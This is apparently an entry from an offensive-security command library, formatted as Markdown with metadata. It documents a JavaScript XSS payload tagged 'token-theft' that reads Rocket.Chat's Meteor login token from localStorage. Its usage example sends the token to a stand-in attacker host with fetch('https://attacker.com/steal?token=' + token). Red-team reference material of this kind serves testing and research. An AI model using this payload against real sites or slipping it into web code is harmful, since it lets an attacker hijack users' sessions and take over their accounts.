---
data: let token = localStorage.getItem('Meteor.loginToken');
tags:
  - token-theft
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.243Z'
id: 962dee8d-87a7-4c9c-99fb-3d827f4f6e32
verified: false
validated: true
submitted: true
---
# rocket-chat-steal-token-js

## Command

```javascript
let token = localStorage.getItem('Meteor.loginToken');
```

## Description

Retrieves the Meteor login token from localStorage in XSS context.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| 'Meteor.loginToken' | Key for token | Yes |

## Examples

### Basic Usage

```javascript
let token = localStorage.getItem('Meteor.loginToken');
fetch('https://attacker.com/steal?token=' + token);
```

## Expected Output

Token string assigned to variable.

## Related

- [[procedures/Steal-Victims-Login-Token]]
